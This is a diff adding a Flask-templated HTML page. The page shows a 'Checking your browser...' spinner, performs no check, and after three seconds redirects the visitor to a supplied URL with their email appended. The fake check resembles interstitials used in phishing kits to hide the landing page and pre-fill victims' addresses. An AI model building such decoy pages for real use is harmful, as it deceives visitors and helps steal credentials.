@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser...</title>
+    <style>
+        html, body {
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-text {
+            font-size: 14px;
+            color: #555;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h2>Checking your browser...</h2>
+        <div class="loader"></div>
+        <p class="status-text">This process should only take a few seconds.</p>
+    </div>
+
+    <script>
+        const redirectUrl = "{{ redirect_url }}"; // Passed from Flask
+        const email = "{{ email }}"; // Passed from Flask (optional)
+        
+        function redirectUser() {
+            let finalUrl = redirectUrl;
+            if (email) {
+                finalUrl += "?email=" + encodeURIComponent(email);
+            }
+            window.location.href = finalUrl;
+        }
+
+        // Always redirect after 3 seconds
+        setTimeout(redirectUser, 3000);
+    </script>
+</body>
+
+</html>
